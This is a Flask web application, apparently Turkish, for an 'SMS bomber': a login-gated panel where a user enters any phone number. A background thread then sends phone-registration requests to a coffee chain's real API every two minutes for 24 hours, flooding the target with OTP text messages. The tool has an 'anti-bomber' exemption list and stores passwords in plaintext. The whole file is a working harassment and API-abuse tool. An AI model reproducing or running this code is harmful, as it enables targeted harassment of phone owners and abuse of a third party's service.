from flask import Flask, render_template_string, request, jsonify, redirect, url_for
from flask_sqlalchemy import SQLAlchemy
from flask_login import LoginManager, UserMixin, login_user, login_required, logout_user
import threading
import time
import requests
import random
import os
import datetime

app = Flask(__name__)
app.config['SECRET_KEY'] = 'dis5-private-key-99'
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///database.db'
db = SQLAlchemy(app)
login_manager = LoginManager(app)
login_manager.login_view = 'login'

# --- VERİTABANI MODELLERİ ---
class User(UserMixin, db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(50), unique=True, nullable=False)
    password = db.Column(db.String(50), nullable=False)

# Koruma Altındaki Numaralar (Anti-Bomb)
protected_numbers = set()

# --- MOTOR SİSTEMİ ---
def send_otp_bomb(full_phone):
    if full_phone in protected_numbers:
        print(f"[SHIELD] {full_phone} KORUMA ALTINDA! ISLEM IPTAL.")
        return

    end_time = datetime.datetime.now() + datetime.timedelta(hours=24)
    print(f"[DIS5-EUROPE] Operasyon Baslatildi: {full_phone}")

    while datetime.datetime.now() < end_time:
        if full_phone in protected_numbers: 
            print(f"[STOP] {full_phone} Icin Islem Durduruldu.")
            break
        try:
            # Kahve Dunyasi API
            requests.post("https://api.kahvedunyasi.com/api/v1/auth/account/register/phone-number", 
                json={"phoneNumber": full_phone, "otp": str(random.randint(100000, 999999))},
                headers={"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"},
                timeout=10)
            print(f"[DIS5-EUROPE] Paket Gonderildi: {full_phone}")
        except:
            pass
        time.sleep(120 + random.uniform(0.1, 5.0))

# --- TASARIM VE TEMA (CSS) ---
CSS = """
<style>
    body { background: #000; color: #fff; font-family: 'Arial', sans-serif; margin: 0; height: 100vh; display: flex; justify-content: center; align-items: center; flex-direction: column; }
    .panel { background: #0a0a0a; border: 1px solid #1a1a1a; padding: 40px; border-radius: 5px; width: 360px; text-align: center; }
    .header h1 { font-size: 0.9em; letter-spacing: 5px; text-transform: uppercase; margin-bottom: 5px; }
    .header p { font-size: 0.6em; color: #444; letter-spacing: 2px; margin-bottom: 30px; }
    .input-group { background: #111; border: 1px solid #222; display: flex; align-items: center; margin-bottom: 20px; }
    input, select { background: transparent; border: none; color: #fff; padding: 15px; outline: none; width: 100%; letter-spacing: 2px; font-size: 0.8em; }
    .btn { width: 100%; background: #fff; color: #000; border: none; padding: 18px; font-weight: 900; cursor: pointer; letter-spacing: 1px; text-transform: uppercase; transition: 0.3s; margin-top: 10px; }
    .btn:hover { background: #ccc; }
    .btn-anti { background: #ff0000 !important; color: #fff !important; font-size: 0.7em; }
    .links { margin-top: 20px; font-size: 0.6em; }
    .links a { color: #444; text-decoration: none; text-transform: uppercase; letter-spacing: 1px; }
    option { background: #000; color: #fff; }
</style>
"""

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        user = User(username=request.form['user'], password=request.form['pass'])
        db.session.add(user)
        db.session.commit()
        return redirect(url_for('login'))
    return render_template_string(CSS + """
    <div class="panel">
        <div class="header"><h1>KAYIT OL</h1><p>DIS5 ACCESS CONTROL</p></div>
        <form method="POST">
            <div class="input-group"><input name="user" placeholder="KULLANICI ADI" required></div>
            <div class="input-group"><input type="password" name="pass" placeholder="SIFRE" required></div>
            <button class="btn">KAYDI TAMAMLA</button>
        </form>
    </div>""")

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        user = User.query.filter_by(username=request.form['user'], password=request.form['pass']).first()
        if user:
            login_user(user)
            return redirect(url_for('home'))
    return render_template_string(CSS + """
    <div class="panel">
        <div class="header"><h1>GIRIS YAP</h1><p>DIS5 SECURE LOGIN</p></div>
        <form method="POST">
            <div class="input-group"><input name="user" placeholder="KULLANICI ADI" required></div>
            <div class="input-group"><input type="password" name="pass" placeholder="SIFRE" required></div>
            <button class="btn">ERISIM SAGLA</button>
        </form>
        <div class="links"><a href="/register">Yeni Hesap Olustur</a></div>
    </div>""")

@app.route('/')
@login_required
def home():
    return render_template_string(CSS + """
    <div class="panel">
        <div class="header"><h1>DIS5 Europe</h1><p>PHONE SYSTEM CONTROL</p></div>
        <div class="input-group">
            <select id="prefix">
                <option value="90">Türkiye (+90)</option>
                <option value="1">USA (+1)</option>
                <option value="44">UK (+44)</option>
                <option value="49">Germany (+49)</option>
                <option value="33">France (+33)</option>
            </select>
        </div>
        <div class="input-group">
            <input type="tel" id="phone" placeholder="5XXXXXXXXX" maxlength="10">
        </div>
        <button id="launch-btn" class="btn">SUCCESS / FIRLAT</button>
        <button id="anti-btn" class="btn btn-anti">ANTI-BOMBER (KORUMA)</button>
        <div id="status" style="display: none; color: #00ff00; font-size: 0.7em; margin-top: 20px; font-family: monospace;"></div>
        <div class="links"><a href="/logout">Güvenli Çıkış</a></div>
    </div>
    <script>
        function action(url) {
            var p = document.getElementById('phone').value;
            var c = document.getElementById('prefix').value;
            if(p.length < 5) return;
            fetch(url, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({phone: c + p})
            }).then(res => res.json()).then(data => {
                document.getElementById('status').style.display = 'block';
                document.getElementById('status').innerText = "STATUS: " + data.msg;
            });
        }
        document.getElementById('launch-btn').addEventListener('click', () => action('/start-payload'));
        document.getElementById('anti-btn').addEventListener('click', () => action('/anti-protect'));
    </script>""")

@app.route('/start-payload', methods=['POST'])
@login_required
def start_payload():
    phone = request.json.get('phone')
    threading.Thread(target=send_otp_bomb, args=(phone,), daemon=True).start()
    return jsonify({"msg": "DEPLOYING PAYLOAD..."})

@app.route('/anti-protect', methods=['POST'])
@login_required
def anti_protect():
    phone = request.json.get('phone')
    protected_numbers.add(phone)
    return jsonify({"msg": "NUMBER PROTECTED!"})

@app.route('/logout')
def logout():
    logout_user()
    return redirect(url_for('login'))

@login_manager.user_loader
def load_user(uid):
    return User.query.get(int(uid))

if __name__ == "__main__":
    with app.app_context():
        db.create_all()
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
